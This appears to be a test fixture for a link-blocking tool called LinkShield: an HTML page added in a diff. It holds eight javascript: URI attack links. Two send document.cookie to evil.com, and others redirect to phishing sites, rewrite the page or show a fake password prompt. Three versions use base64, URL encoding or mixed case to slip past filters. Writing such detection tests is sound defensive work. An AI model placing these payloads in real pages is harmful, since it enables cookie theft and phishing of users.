@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JavaScript URI Attack Test - Security Audit 5.2</title>
+    <style>
+        body {
+            padding: 20px;
+            font-family: Arial, sans-serif;
+        }
+
+        .test-item {
+            margin: 15px 0;
+            padding: 10px;
+            border: 1px solid #ccc;
+            background: #f9f9f9;
+        }
+
+        .dangerous {
+            color: red;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>JavaScript URI Attack Test</h1>
+    <p>LinkShield must detect and block javascript: URI schemes.</p>
+
+    <div class="test-item">
+        <h3>Test 1: Location Hijack</h3>
+        <a href="javascript:void(window.location='http://phishing.com')" class="dangerous">
+            Click Here (location hijack)
+        </a>
+    </div>
+
+    <div class="test-item">
+        <h3>Test 2: Cookie Stealer</h3>
+        <a href="javascript:fetch('http://evil.com/steal?cookie='+document.cookie)" class="dangerous">
+            Click Here (cookie stealer)
+        </a>
+    </div>
+
+    <div class="test-item">
+        <h3>Test 3: DOM Manipulation</h3>
+        <a href="javascript:document.body.innerHTML='<h1>Hacked</h1>'" class="dangerous">
+            Click Here (DOM inject)
+        </a>
+    </div>
+
+    <div class="test-item">
+        <h3>Test 4: Credential Harvester</h3>
+        <a href="javascript:void(prompt('Enter password to continue:'))" class="dangerous">
+            Click Here (fake password prompt)
+        </a>
+    </div>
+
+    <div class="test-item">
+        <h3>Test 5: Obfuscated JavaScript</h3>
+        <a href="javascript:void(eval(atob('d2luZG93LmxvY2F0aW9uPSdodHRwOi8vZXZpbC5jb20n')))" class="dangerous">
+            Click Here (base64 obfuscated)
+        </a>
+        <div style="font-size: 12px; color: #666;">
+            Decodes to: window.location='http://evil.com'
+        </div>
+    </div>
+
+    <div class="test-item">
+        <h3>Test 6: Multi-line JavaScript</h3>
+        <a href="javascript:void(
+            var%20u='http://evil.com/steal';
+            var%20d=document.cookie;
+            fetch(u+'?data='+d)
+        )" class="dangerous">
+            Click Here (multi-line script)
+        </a>
+    </div>
+
+    <div class="test-item">
+        <h3>Test 7: URL Encoded JavaScript</h3>
+        <a href="javascript%3avoid%28window.location%3D%27http%3A%2F%2Fevil.com%27%29" class="dangerous">
+            Click Here (URL encoded)
+        </a>
+    </div>
+
+    <div class="test-item">
+        <h3>Test 8: Mixed Case Evasion</h3>
+        <a href="JaVaScRiPt:void(location='http://phishing.com')" class="dangerous">
+            Click Here (mixed case)
+        </a>
+    </div>
+
+    <script>
+        console.log('[JAVASCRIPT URI] Loaded 8 javascript: URI attack vectors');
+        console.log('[JAVASCRIPT URI] All should be detected and blocked');
+    </script>
+</body>
+
+</html>
